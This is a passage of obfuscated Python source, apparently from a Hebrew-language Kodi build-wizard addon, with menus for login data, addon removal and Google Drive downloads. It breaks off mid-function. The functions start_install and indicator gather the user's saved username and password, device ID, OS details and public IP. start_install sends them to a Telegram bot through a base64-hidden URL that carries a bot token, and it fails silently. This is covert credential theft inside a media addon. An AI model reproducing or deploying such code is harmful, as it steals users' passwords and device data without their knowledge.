		OOOO00O00O000O0OO =LOGINID [OOO00O0OO0O00O00O ]['saved']#line:2451
		O0OOOO00OO0O000O0 =LOGINID [OOO00O0OO0O00O00O ]['file']#line:2452
		OO0O0O0OO0O0O0OOO =wiz .getS (OOOO00O00O000O0OO )#line:2453
		O0O0OO000O0OO0OO0 =loginit .loginUser (OOO00O0OO0O00O00O )#line:2454
		OO0O0O00OO00OOO0O =LOGINID [OOO00O0OO0O00O00O ]['icon']if os .path .exists (OOOOO000O0OO00O00 )else ICONLOGIN #line:2455
		OO0O0O00O000O0O0O =LOGINID [OOO00O0OO0O00O00O ]['fanart']if os .path .exists (OOOOO000O0OO00O00 )else FANART #line:2456
		O0O00O0O000OOOOOO =createMenu ('saveaddon','Login',OOO00O0OO0O00O00O )#line:2457
		OO00000O0OOOO0OO0 =createMenu ('save','Login',OOO00O0OO0O00O00O )#line:2458
		O0O00O0O000OOOOOO .append ((THEME2 %'%s Settings'%OO0000OO0O0OO0OO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO00O0OO0O00O00O )))#line:2459
		addFile ('[+]-> %s'%OO0000OO0O0OO0OO0 ,'',icon =OO0O0O00OO00OOO0O ,fanart =OO0O0O00O000O0O0O ,themeit =THEME3 )#line:2461
		if not os .path .exists (OOOOO000O0OO00O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O0O00OO00OOO0O ,fanart =OO0O0O00O000O0O0O ,menu =O0O00O0O000OOOOOO )#line:2462
		elif not O0O0OO000O0OO0OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO00O0OO0O00O00O ,icon =OO0O0O00OO00OOO0O ,fanart =OO0O0O00O000O0O0O ,menu =O0O00O0O000OOOOOO )#line:2463
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0OO000O0OO0OO0 ,'authlogin',OOO00O0OO0O00O00O ,icon =OO0O0O00OO00OOO0O ,fanart =OO0O0O00O000O0O0O ,menu =O0O00O0O000OOOOOO )#line:2464
		if OO0O0O0OO0O0O0OOO =="":#line:2465
			if os .path .exists (O0OOOO00OO0O000O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO00O0OO0O00O00O ,icon =OO0O0O00OO00OOO0O ,fanart =OO0O0O00O000O0O0O ,menu =OO00000O0OOOO0OO0 )#line:2466
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO00O0OO0O00O00O ,icon =OO0O0O00OO00OOO0O ,fanart =OO0O0O00O000O0O0O ,menu =OO00000O0OOOO0OO0 )#line:2467
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0O0OO0O0O0OOO ,'',icon =OO0O0O00OO00OOO0O ,fanart =OO0O0O00O000O0O0O ,menu =OO00000O0OOOO0OO0 )#line:2468
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2470
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2471
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2472
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2473
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2474
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2475
	setView ('files','viewType')#line:2476
def fixUpdate ():#line:2478
	if KODIV <17 :#line:2479
		O0O0O0O00OO0000O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2480
		try :#line:2481
			os .remove (O0O0O0O00OO0000O0 )#line:2482
		except Exception as OOOO00O0OO0O0OO0O :#line:2483
			wiz .log ("Unable to remove %s, Purging DB"%O0O0O0O00OO0000O0 )#line:2484
			wiz .purgeDb (O0O0O0O00OO0000O0 )#line:2485
	else :#line:2486
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2487
def removeAddonMenu ():#line:2489
	O00OOOO00OO0000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2490
	O0OO0OOO00OO000O0 =[];OO0000O00OOOOO000 =[]#line:2491
	for OO00O0O0OO0OO0O0O in sorted (O00OOOO00OO0000O0 ,key =lambda OO0O00OO0OOOO0O00 :OO0O00OO0OOOO0O00 ):#line:2492
		O0O00000OOOOO00O0 =os .path .split (OO00O0O0OO0OO0O0O [:-1 ])[1 ]#line:2493
		if O0O00000OOOOO00O0 in EXCLUDES :continue #line:2494
		elif O0O00000OOOOO00O0 in DEFAULTPLUGINS :continue #line:2495
		elif O0O00000OOOOO00O0 =='packages':continue #line:2496
		OOOOO0O0000O0OOO0 =os .path .join (OO00O0O0OO0OO0O0O ,'addon.xml')#line:2497
		if os .path .exists (OOOOO0O0000O0OOO0 ):#line:2498
			OO0O00OO0OOO00OO0 =open (OOOOO0O0000O0OOO0 )#line:2499
			OO0O000O00OOO0O0O =OO0O00OO0OOO00OO0 .read ()#line:2500
			O0OO000O00O0OO00O =wiz .parseDOM (OO0O000O00OOO0O0O ,'addon',ret ='id')#line:2501
			O0O0OOO000OOOOOO0 =O0O00000OOOOO00O0 if len (O0OO000O00O0OO00O )==0 else O0OO000O00O0OO00O [0 ]#line:2503
			try :#line:2504
				OOO0OOO0OO000OO0O =xbmcaddon .Addon (id =O0O0OOO000OOOOOO0 )#line:2505
				O0OO0OOO00OO000O0 .append (OOO0OOO0OO000OO0O .getAddonInfo ('name'))#line:2506
				OO0000O00OOOOO000 .append (O0O0OOO000OOOOOO0 )#line:2507
			except :#line:2508
				pass #line:2509
	if len (O0OO0OOO00OO000O0 )==0 :#line:2510
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:2511
		return #line:2512
	if KODIV >16 :#line:2513
		OOO0000O00OO00OO0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO0OOO00OO000O0 )#line:2514
	else :#line:2515
		OOO0000O00OO00OO0 =[];O00OO00O000OOOO0O =0 #line:2516
		OOO000OOO0OO00O00 =["-- Click here to Continue --"]+O0OO0OOO00OO000O0 #line:2517
		while not O00OO00O000OOOO0O ==-1 :#line:2518
			O00OO00O000OOOO0O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO000OOO0OO00O00 )#line:2519
			if O00OO00O000OOOO0O ==-1 :break #line:2520
			elif O00OO00O000OOOO0O ==0 :break #line:2521
			else :#line:2522
				OOO0OO00OO0O0OO0O =(O00OO00O000OOOO0O -1 )#line:2523
				if OOO0OO00OO0O0OO0O in OOO0000O00OO00OO0 :#line:2524
					OOO0000O00OO00OO0 .remove (OOO0OO00OO0O0OO0O )#line:2525
					OOO000OOO0OO00O00 [O00OO00O000OOOO0O ]=O0OO0OOO00OO000O0 [OOO0OO00OO0O0OO0O ]#line:2526
				else :#line:2527
					OOO0000O00OO00OO0 .append (OOO0OO00OO0O0OO0O )#line:2528
					OOO000OOO0OO00O00 [O00OO00O000OOOO0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OO0OOO00OO000O0 [OOO0OO00OO0O0OO0O ])#line:2529
	if OOO0000O00OO00OO0 ==None :return #line:2530
	if len (OOO0000O00OO00OO0 )>0 :#line:2531
		wiz .addonUpdates ('set')#line:2532
		for O00O0O0000OO0OO00 in OOO0000O00OO00OO0 :#line:2533
			removeAddon (OO0000O00OOOOO000 [O00O0O0000OO0OO00 ],O0OO0OOO00OO000O0 [O00O0O0000OO0OO00 ],True )#line:2534
		xbmc .sleep (1000 )#line:2536
		if INSTALLMETHOD ==1 :OO0OO0OO0O00O00OO =1 #line:2538
		elif INSTALLMETHOD ==2 :OO0OO0OO0O00O00OO =0 #line:2539
		else :OO0OO0OO0O00O00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:2540
		if OO0OO0OO0O00O00OO ==1 :wiz .reloadFix ('remove addon')#line:2541
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:2542
def removeAddonDataMenu ():#line:2544
	if os .path .exists (ADDOND ):#line:2545
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:2546
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:2547
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:2548
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:2549
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2550
		OOO00OOO00OOOO00O =glob .glob (os .path .join (ADDOND ,'*/'))#line:2551
		for OOO0O0O0OO0OOOO00 in sorted (OOO00OOO00OOOO00O ,key =lambda O0000000OOOOOOOO0 :O0000000OOOOOOOO0 ):#line:2552
			OO0OOOO00OO0OOO0O =OOO0O0O0OO0OOOO00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:2553
			O000OO0O0O00O00OO =os .path .join (OOO0O0O0OO0OOOO00 .replace (ADDOND ,ADDONS ),'icon.png')#line:2554
			OO00OO0OOO0OO0OOO =os .path .join (OOO0O0O0OO0OOOO00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:2555
			OOO0OOOO0OOOO0OO0 =OO0OOOO00OO0OOO0O #line:2556
			O0OOO0000OO000000 ={'audio.':'[COLOR silver][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR silver][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR silver][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR silver][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:2557
			for OO0O000O0OO0O0OOO in O0OOO0000OO000000 :#line:2558
				OOO0OOOO0OOOO0OO0 =OOO0OOOO0OOOO0OO0 .replace (OO0O000O0OO0O0OOO ,O0OOO0000OO000000 [OO0O000O0OO0O0OOO ])#line:2559
			if OO0OOOO00OO0OOO0O in EXCLUDES :OOO0OOOO0OOOO0OO0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO0OOOO0OOOO0OO0 #line:2560
			else :OOO0OOOO0OOOO0OO0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO0OOOO0OOOO0OO0 #line:2561
			addFile (' %s'%OOO0OOOO0OOOO0OO0 ,'removedata',OO0OOOO00OO0OOO0O ,icon =O000OO0O0O00O00OO ,fanart =OO00OO0OOO0OO0OOO ,themeit =THEME2 )#line:2562
	else :#line:2563
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:2564
	setView ('files','viewType')#line:2565
def enableAddons ():#line:2567
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:2568
	OOOOOO0OOOO000OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2569
	O00O000OOOO00000O =0 #line:2570
	for OOOO00OO000OOO000 in sorted (OOOOOO0OOOO000OOO ,key =lambda O0O0O000OO0OOO0O0 :O0O0O000OO0OOO0O0 ):#line:2571
		OO00OO0OOO0O00O00 =os .path .split (OOOO00OO000OOO000 [:-1 ])[1 ]#line:2572
		if OO00OO0OOO0O00O00 in EXCLUDES :continue #line:2573
		if OO00OO0OOO0O00O00 in DEFAULTPLUGINS :continue #line:2574
		O0000O0O0OO0O0OOO =os .path .join (OOOO00OO000OOO000 ,'addon.xml')#line:2575
		if os .path .exists (O0000O0O0OO0O0OOO ):#line:2576
			O00O000OOOO00000O +=1 #line:2577
			OOOOOO0OOOO000OOO =OOOO00OO000OOO000 .replace (ADDONS ,'')[1 :-1 ]#line:2578
			O0O0OOOOOO00OO000 =open (O0000O0O0OO0O0OOO )#line:2579
			OO00OO0OOO00000OO =O0O0OOOOOO00OO000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:2580
			O0000O00OOO000O00 =wiz .parseDOM (OO00OO0OOO00000OO ,'addon',ret ='id')#line:2581
			O0O0OO00O000O0OOO =wiz .parseDOM (OO00OO0OOO00000OO ,'addon',ret ='name')#line:2582
			try :#line:2583
				O00O00OO000OOO000 =O0000O00OOO000O00 [0 ]#line:2584
				OOOO0OO0OOO00O00O =O0O0OO00O000O0OOO [0 ]#line:2585
			except :#line:2586
				continue #line:2587
			try :#line:2588
				OO00OO00OO0O0OO00 =xbmcaddon .Addon (id =O00O00OO000OOO000 )#line:2589
				O0OOO000OO0O00OO0 ="[COLOR green][Enabled][/COLOR]"#line:2590
				OOOOO0OOOO00O0O00 ="false"#line:2591
			except :#line:2592
				O0OOO000OO0O00OO0 ="[COLOR red][Disabled][/COLOR]"#line:2593
				OOOOO0OOOO00O0O00 ="true"#line:2594
				pass #line:2595
			O00O00OO00O0O0000 =os .path .join (OOOO00OO000OOO000 ,'icon.png')if os .path .exists (os .path .join (OOOO00OO000OOO000 ,'icon.png'))else ICON #line:2596
			OO0O0O0OOOO0OOOOO =os .path .join (OOOO00OO000OOO000 ,'fanart.jpg')if os .path .exists (os .path .join (OOOO00OO000OOO000 ,'fanart.jpg'))else FANART #line:2597
			addFile ("%s %s"%(O0OOO000OO0O00OO0 ,OOOO0OO0OOO00O00O ),'toggleaddon',OOOOOO0OOOO000OOO ,OOOOO0OOOO00O0O00 ,icon =O00O00OO00O0O0000 ,fanart =OO0O0O0OOOO0OOOOO )#line:2598
			O0O0OOOOOO00OO000 .close ()#line:2599
	if O00O000OOOO00000O ==0 :#line:2600
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:2601
	setView ('files','viewType')#line:2602
def changeFeq ():#line:2604
	O00O00O0O0O000OO0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:2605
	O0OOOO00O0O000O00 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00O00O0O0O000OO0 )#line:2606
	if not O0OOOO00O0O000O00 ==-1 :#line:2607
		wiz .setS ('autocleanfeq',str (O0OOOO00O0O000O00 ))#line:2608
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00O00O0O0O000OO0 [O0OOOO00O0O000O00 ]))#line:2609
def developer ():#line:2611
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:2612
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:2613
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:2614
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:2615
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:2616
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:2617
	addFile ('Test APk','testapk',themeit =THEME1 )#line:2618
	setView ('files','viewType')#line:2620
def dis_or_enable_addon (OO0O0OOOO00OO000O ,O00O0OOOO0OOOO0OO ,enable ="true"):#line:2626
    import json #line:2627
    O000O00OO00000O00 ='"%s"'%OO0O0OOOO00OO000O #line:2628
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OOOO00OO000O )and enable =="true":#line:2629
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O0OOOO00OO000O )#line:2631
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OOOO00OO000O )and enable =="false":#line:2632
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O0OOOO00OO000O )#line:2633
    else :#line:2634
        OO000O00OO0O00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000O00OO00000O00 ,enable )#line:2635
        O000O0O00O00OOOOO =xbmc .executeJSONRPC (OO000O00OO0O00O00 )#line:2636
        OOOOOOO0OO00OOOOO =json .loads (O000O0O00O00OOOOO )#line:2637
        if enable =="true":#line:2638
            xbmc .log ("### Enabled %s, response = %s"%(OO0O0OOOO00OO000O ,OOOOOOO0OO00OOOOO ))#line:2639
        else :#line:2640
            xbmc .log ("### Disabled %s, response = %s"%(OO0O0OOOO00OO000O ,OOOOOOO0OO00OOOOO ))#line:2641
    if O00O0OOOO0OOOO0OO =='auto':#line:2642
     return True #line:2643
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:2644
def chunk_report (O0O00OOOO000OO0O0 ,OO0O000O0O000O0OO ,O0OOOO00OOO0O00O0 ):#line:2645
   O0O00OO0O00O00OO0 =float (O0O00OOOO000OO0O0 )/O0OOOO00OOO0O00O0 #line:2646
   O0O00OO0O00O00OO0 =round (O0O00OO0O00O00OO0 *100 ,2 )#line:2647
   if O0O00OOOO000OO0O0 >=O0OOOO00OOO0O00O0 :#line:2649
      sys .stdout .write ('\n')#line:2650
def googledrive_download (OO0000OOO000O0O0O ,OOO0OO00O0000OO00 ,O00O00OOO00O0000O ,OOOOOOOO0OOOO00O0 ):#line:2653
    import urllib .request #line:2655
    import sys #line:2656
    import io ,time #line:2657
    O00O00O000O00OO0O =OO0000OOO000O0O0O .split ('=')#line:2658
    OO0000OOO000O0O0O =O00O00O000O00OO0O [len (O00O00O000O00OO0O )-1 ]#line:2659
    O0000O0OOO00O00OO ={'authority':'drive.google.com','content-length':'0','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','upgrade-insecure-requests':'1','origin':'https://drive.google.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://drive.google.com/uc?id=%s&export=download'%OO0000OOO000O0O0O ,'accept-language':'he-IL,he;q=0.9',}#line:2678
    OOOO0OO0OOOOO0O0O ='https://drive.google.com/uc?id=%s&export=download&confirm=t'%OO0000OOO000O0O0O #line:2680
    O0OO0O000OO000O00 =urllib .request .Request (OOOO0OO0OOOOO0O0O ,headers =O0000O0OOO00O00OO )#line:2681
    O0OO000000O00000O =urllib .request .urlopen (O0OO0O000OO000O00 )#line:2682
    OOO00O0O0O0O0O0OO =O0OO000000O00000O .getheader ('content-length')#line:2683
    if OOO00O0O0O0O0O0OO :#line:2684
        OOO00O0O0O0O0O0OO =int (OOO00O0O0O0O0O0OO )#line:2685
        OOOOOOOO0OO0O0OO0 =max (4096 ,OOO00O0O0O0O0O0OO //100 )#line:2686
    else :#line:2687
        OOOOOOOO0OO0O0OO0 =1000000 #line:2688
    O0O0O000O0O0000O0 =io .BytesIO ()#line:2692
    OOO0OOOOOOO0O0OOO =0 #line:2693
    with open (OOO0OO00O0000OO00 ,"wb")as O00000000000OO0O0 :#line:2695
      O0OOO0OOOOO0O0O00 =1 #line:2696
      OO00O00O00OO0OOOO =time .time ()#line:2697
      while 1 :#line:2698
        OO0OO00000O000000 =O0OO000000O00000O .read (OOOOOOOO0OO0O0OO0 )#line:2699
        if not OO0OO00000O000000 :#line:2700
            break #line:2701
        O00000000000OO0O0 .write (OO0OO00000O000000 )#line:2702
        O00000000000OO0O0 .flush ()#line:2703
        OOO0OOOOOOO0O0OOO +=len (OO0OO00000O000000 )#line:2704
        OOO0O0O0O0OO000OO =time .time ()-OO00O00O00OO0OOOO #line:2705
        O0OOO00O000O000OO =int (O0OOO0OOOOO0O0O00 *OOOOOOOO0OO0O0OO0 )#line:2706
        OOO000O0O0OOO00O0 =int ((O0OOO00O000O000OO )/(1024 *OOO0O0O0O0OO000OO ))#line:2708
        O0OO0O00O00OOO0O0 =int (O0OOO0OOOOO0O0O00 *OOOOOOOO0OO0O0OO0 *100 /OOO00O0O0O0O0O0OO )#line:2709
        if OOO000O0O0OOO00O0 >1024 and not O0OO0O00O00OOO0O0 ==100 :#line:2710
          OOOOOO00O0000OO0O =int (((OOO00O0O0O0O0O0OO -O0OOO00O000O000OO )/1024 )/(OOO000O0O0OOO00O0 ))#line:2711
        else :#line:2712
          OOOOOO00O0000OO0O =0 #line:2713
        O0OOO0OOOOO0O0O00 +=1 #line:2715
        O00O00OOO00O0000O .update (int (O0OO0O00O00OOO0O0 ),"\r%d%%,[COLOR yellow] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO0O00O00OOO0O0 ,O0OOO00O000O000OO /(1024 *1024 ),OOO00O0O0O0O0O0OO /(1000 *1000 ),OOO000O0O0OOO00O0 )+'\n'+'[B]ETA:[/B] [COLOR yellow]%02d:%02d[/COLOR]'%divmod (OOOOOO00O0000OO0O ,60 ))#line:2716
        if O00O00OOO00O0000O .iscanceled ():#line:2719
         O00O00OOO00O0000O .close ()#line:2720
         break #line:2721
def googledrive_download_BG (OO0000O0000O0O000 ,O00OO0O0OO0000OOO ,OOO0OOO0OOOOO0O00 ,O00O0O00O0OOO00OO ):#line:2723
    OOO0OOO0OOOOO0O00 .create ('[B][COLOR=green]מוריד עדכון מערכת                         [/COLOR][/B]')#line:2725
    import urllib .request #line:2726
    import sys #line:2727
    import io ,time #line:2728
    O0000O0OOOO0OO000 =OO0000O0000O0O000 .split ('=')#line:2729
    OO0000O0000O0O000 =O0000O0OOOO0OO000 [len (O0000O0OOOO0OO000 )-1 ]#line:2730
    OO00O0OOO00OOO00O ={'authority':'drive.google.com','content-length':'0','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','upgrade-insecure-requests':'1','origin':'https://drive.google.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://drive.google.com/uc?id=%s&export=download'%OO0000O0000O0O000 ,'accept-language':'he-IL,he;q=0.9',}#line:2749
    OOOO00OO00O00O0O0 ='https://drive.google.com/uc?id=%s&export=download&confirm=t'%OO0000O0000O0O000 #line:2751
    O0O0OOOOO00O000OO =urllib .request .Request (OOOO00OO00O00O0O0 ,headers =OO00O0OOO00OOO00O )#line:2752
    O000O00OOO000O00O =urllib .request .urlopen (O0O0OOOOO00O000OO )#line:2753
    OO00O0OO00O0000OO =O000O00OOO000O00O .getheader ('content-length')#line:2754
    if OO00O0OO00O0000OO :#line:2755
        OO00O0OO00O0000OO =int (OO00O0OO00O0000OO )#line:2756
        O0O0000O000OOO0O0 =max (4096 ,OO00O0OO00O0000OO //100 )#line:2757
    else :#line:2758
        O0O0000O000OOO0O0 =1000000 #line:2759
    O0OOO000O00OOO0OO =io .BytesIO ()#line:2763
    O0OOOO0O000O0O0OO =0 #line:2764
    with open (O00OO0O0OO0000OOO ,"wb")as O000O0O0000O0O0OO :#line:2766
      OO0O00OO00OO000OO =1 #line:2767
      O0O0OOOO0OOO000O0 =time .time ()#line:2768
      while 1 :#line:2769
        O0000O00000OO0000 =O000O00OOO000O00O .read (O0O0000O000OOO0O0 )#line:2770
        if not O0000O00000OO0000 :#line:2771
            break #line:2772
        O000O0O0000O0O0OO .write (O0000O00000OO0000 )#line:2773
        O000O0O0000O0O0OO .flush ()#line:2774
        O0OOOO0O000O0O0OO +=len (O0000O00000OO0000 )#line:2775
        O0000000O0OOOO000 =time .time ()-O0O0OOOO0OOO000O0 #line:2776
        O0O0OO0O0O0OOOO0O =int (OO0O00OO00OO000OO *O0O0000O000OOO0O0 )#line:2777
        O000O000O00000O0O =int ((O0O0OO0O0O0OOOO0O )/(1024 *O0000000O0OOOO000 ))#line:2779
        O00OO000000000OOO =int (OO0O00OO00OO000OO *O0O0000O000OOO0O0 *100 /OO00O0OO00O0000OO )#line:2780
        if O000O000O00000O0O >1024 and not O00OO000000000OOO ==100 :#line:2781
          OOO00O0O000OO00OO =int (((OO00O0OO00O0000OO -O0O0OO0O0O0OOOO0O )/1024 )/(O000O000O00000O0O ))#line:2782
        else :#line:2783
          OOO00O0O000OO00OO =0 #line:2784
        OO0O00OO00OO000OO +=1 #line:2786
        OOO0OOO0OOOOO0O00 .update (int (O00OO000000000OOO ),"\r%d%%,[COLOR yellow] %d MB / %d MB [/COLOR], %d KB/s "%(O00OO000000000OOO ,O0O0OO0O0O0OOOO0O /(1024 *1024 ),OO00O0OO00O0000OO /(1000 *1000 ),O000O000O00000O0O ),'[B]זמן שנותר: [/B][COLOR yellow]%02d:%02d[/COLOR]'%divmod (OOO00O0O000OO00OO ,60 ))#line:2787
def start_install (O0000O0O00000O0OO ):#line:2790
       try :#line:2794
          import json ,requests #line:2795
          OO00000O00O000000 =wiz .getS ("date_user")#line:2796
          wiz .log ('FRESH MESSAGE')#line:2797
          O000O00OO00000000 =(wiz .getS ("user"))#line:2798
          O0OOO00O0OOOOO0O0 =(wiz .getS ("pass"))#line:2799
          OOO00OO0OO0OOOO0O =(wiz .getS ("dragon"))#line:2800
          OO0O0O000O0O00O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2801
          OOOOO000000000OO0 =platform .uname ()#line:2802
          OO0O000O000OO0O00 =OOOOO000000000OO0 [1 ]#line:2803
          if wiz .getS ('dragon')=='true':#line:2806
            OOO0O00O0OOOO0O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:2807
          else :#line:2809
            OOO0O00O0OOOO0O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:2811
          OOOOO0O0OOOOOOO0O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:2813
          OO0O0O0OO000000OO =O000O00OO00000000 #line:2816
          OO0O0OOO000O0OO00 =O0OOO00O0OOOOO0O0 #line:2817
          if OOO00OO0OO0OOOO0O =='true':#line:2819
            OO00O0O0000OOOOOO ='Dragon'#line:2820
          else :#line:2821
            OO00O0O0000OOOOOO ='AnonymousTV'#line:2822
          O0OOOOOOOOO0O000O =requests .get (OOO0O00O0OOOO0O0O +que (O0000O0O00000O0OO )+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OO0O0O0OO000000OO +que (' סיסמה: ')+OO0O0OOO000O0OO00 +que (' קודי: ')+OO0O0O000O0O00O00 +que (' כתובת: ')+OOOOO0O0OOOOOOO0O +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO0O000O000OO0O00 +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+OO00000O00O000000 +que (' סוג מנוי: ')+OO00O0O0000OOOOOO ).json ()#line:2823
       except :pass #line:2824
def indicator ():#line:2826
       try :#line:2830
          import json ,requests #line:2831
          O0O00O00O0O00O000 =wiz .getS ("date_user")#line:2832
          wiz .log ('FRESH MESSAGE')#line:2833
          O00000O000OO00OOO =(wiz .getS ("user"))#line:2834
          O0OOOO0O0O0O0OOOO =(wiz .getS ("pass"))#line:2835
          O0OOO0OOO000OOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2836
          OOOOO000OO0000OO0 =platform .uname ()#line:2837
          OO00OOO0OOO0O0OO0 =OOOOO000OO0000OO0 [1 ]#line:2838
          if wiz .getS ('dragon')=='true':#line:2839
                OOO00O00OOOOOO0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:2840
          else :#line:2841
